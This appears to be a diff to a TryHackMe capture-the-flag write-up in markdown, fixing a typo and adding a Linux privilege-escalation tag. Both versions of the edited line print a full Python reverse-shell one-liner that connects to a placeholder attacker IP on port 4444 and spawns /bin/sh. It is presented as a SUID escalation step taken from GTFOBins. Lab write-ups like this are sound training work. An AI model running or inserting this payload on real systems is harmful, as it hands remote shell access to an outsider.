@@ -82,7 +82,7 @@ Read through them and find the answer
 
 For this one i use gtfobins (https://gtfobins.org/#//^suid$)
 
-With the python privesc methon i ended up using this command `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` and the ip addres that it's in (https://tryhackme.com/manage-account/access) under openvpn as my ip
+With the python privesc method i ended up using this command `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` and the ip addres that it's in (https://tryhackme.com/manage-account/access) under openvpn as my ip
 
 ![](../Img/Pasted%20image%2020260314174141.png)
 
@@ -99,4 +99,4 @@ Search for it
 ![](../Img/Pasted%20image%2020260314174347.png)
 
 
-Tags: [Burp Suite](../Index/Burp%20Suite.md) [Fuzzing](../Index/Fuzzing.md) [File Uploads](../Index/File%20Uploads.md) [Nmap](../Index/Nmap.md) 
+Tags: [Burp Suite](../Index/Burp%20Suite.md) [Fuzzing](../Index/Fuzzing.md) [File Uploads](../Index/File%20Uploads.md) [Lin Privesc](../Index/Lin%20Privesc.md) [Nmap](../Index/Nmap.md) 
